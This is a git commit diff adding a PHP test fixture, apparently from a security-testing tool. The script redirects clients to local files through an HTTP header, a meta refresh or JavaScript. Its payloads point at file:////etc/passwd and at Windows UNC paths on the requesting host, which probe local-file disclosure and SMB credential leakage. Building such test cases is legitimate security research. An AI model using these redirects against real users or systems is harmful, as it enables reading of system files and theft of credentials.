19dc6a438edbce295db3fdfc68efe61c5c9637b9
Gareth Heyes <gareth.heyes@portswigger.net>
2017-06-15 11:38:47 +0100

    Initial commit

---
+++ tests/redirect.php
@@ -0,0 +1,31 @@
+<?php
+$redirectType = isset($_GET['redirectType']) ? $_GET['redirectType'] : '';
+$os = isset($_GET['os']) ? $_GET['os'] : '';
+if($redirectType === 'http') {
+	if($os === 'windows') {
+		header("Location: file://\\\\".$_SERVER['HTTP_HOST']."\\map\\exploit_redirect_local_file_iframe_windows");
+	} else {
+		header("Location: file:////etc/passwd");
+	}
+	exit();
+} else if($redirectType === 'meta') {
+	?>
+<html>
+<head>
+<!-- IGNORE THIS CONTENTS -->
+<meta http-equiv="refresh" content="0;url=<?php echo $os === 'windows' ? 'file://\\\\'.$_SERVER['HTTP_HOST'].'\\map\\exploit_redirect_meta_local_file_iframe_windows': 'file:////etc/passwd'?>" />
+</head>
+</html>
+	<?php
+} else if($redirectType === 'javascript') {
+?>
+<html>
+<head>
+<!-- IGNORE THIS CONTENTS -->
+<script>location='<?php echo $os === 'windows' ? 'file://\\\\'.$_SERVER['HTTP_HOST'].'\\map\\exploit_redirect_meta_local_file_iframe_windows': 'file:////etc/passwd'?>';
+</script>
+</head>
+</html>
+<?php
+}
+?>
